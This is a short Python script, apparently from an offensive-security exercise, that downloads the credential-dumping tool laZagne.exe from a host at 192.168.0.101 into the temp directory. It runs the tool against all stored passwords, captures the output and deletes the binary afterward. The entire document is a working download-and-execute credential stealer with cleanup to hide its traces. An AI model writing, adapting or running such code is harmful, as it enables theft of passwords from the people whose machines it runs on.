#!/usr/bin/env python

import requests, subprocess, os, tempfile

def download(url):
    response = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name, "wb") as out_file:
        out_file.write(response.content)

temp_directory = tempfile.gettempdir()
os.chdir(temp_directory)
download("http://192.168.0.101/evil-files/laZagne.exe")
result = subprocess.check_output("laZagne.exe all", shell=True)
os.remove("laZagne.exe")
